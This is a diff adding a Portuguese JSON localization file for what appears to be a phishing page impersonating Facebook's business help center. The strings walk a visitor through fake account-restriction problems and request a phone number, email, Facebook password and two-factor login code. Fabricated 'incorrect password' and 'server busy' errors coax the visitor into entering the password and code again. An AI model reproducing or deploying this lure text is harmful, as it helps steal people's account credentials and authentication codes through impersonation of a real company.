@@ -1,0 +1,59 @@
+{
+  "translation": {
+    "title": "Central de Ajuda para Empresas do Facebook",
+    "title2": "Venda pelo Facebook",
+    "very_phone": "Por favor insira um número de telefone válido.",
+    "banner-content": "Agente Via Center",
+    "description": "Como podemos te ajudar?",
+    "description2": "Como podemos ajudar?",
+    "text": "Precisamos de mais informações para resolver seu problema. ",
+    "label": "Os problemas mais comuns",
+    "btn": "Fui impedido de usar um recurso",
+    "btn1": "Minha conta é restrita",
+    "btn2": "Minhas fotos e vídeos violam políticas",
+    "btn3": "Meu site é restrito",
+    "btn4": "Preciso proteger minha conta",
+    "btn5": "Outros problemas",
+    "button": "Próximo",
+    "form-title": "Obter ajuda",
+    "phone": "Número de telefone",
+    "text-batbuoc": "solicitar",
+    "email": "Endereço de email",
+    "form2-title2": "Por favor digite sua senha do Facebook para continuar",
+    "form2-content": "Precisamos confirmar se a pessoa que está enviando as informações é você. Digite sua senha do Facebook e continue.",
+    "password": "Senha",
+    "validate-true": "Verifique as informações",
+    "chat_btn": "Começar a conversar"
+  },
+  "frm_input1": {
+    "home_title": "Por favor, digite sua senha do Facebook para continuar",
+    "modal__body-description": "Precisamos confirmar se a pessoa que está enviando as informações é você. Digite sua senha do Facebook e continue.",
+    "password": "Senha",
+    "btn_send_continue": "Continuar",
+    "validate-true": "Verifique as informações",
+    "text-danger": "O servidor está ocupado! ",
+    "text-danger1": "A senha está incorreta, tente novamente.",
+    "text-danger2": "Requer refazer o sistema. ",
+    "input1": "Digite a bagunça com sucesso"
+  },
+  "frm_input2": {
+    "home_title": "Digite o código de login para continuar",
+    "description": "Sua conta tem autenticação de dois fatores habilitada, o que requer esta etapa adicional de login.",
+    "title": "Aprovar de outro dispositivo",
+    "description2": "Verifique a notificação do Facebook onde você fez login em sua conta e aprove o login para continuar.",
+    "title2": "Ou digite seu código de login",
+    "description3": "Insira o código de 6 a 8 dígitos do seu telefone ou do aplicativo autenticador que você configurou.",
+    "button": "Enviar código",
+    "validate-true": "Verifique as informações",
+    "text-danger": "O servidor está ocupado! ",
+    "text-danger1": "A senha está incorreta, tente novamente.",
+    "text-danger2": "Requer refazer o sistema. ",
+    "button1": "Enviar para",
+    "placeholder": "Código de acesso"
+  },
+  "notification": {
+    "text-danger1": "O código de autenticação está incorreto. Tente novamente.",
+    "title": "Desculpe, esta página não existe,",
+    "title2": "O link em que você clicou pode estar quebrado ou a página pode ter sido removida."
+  }
+}
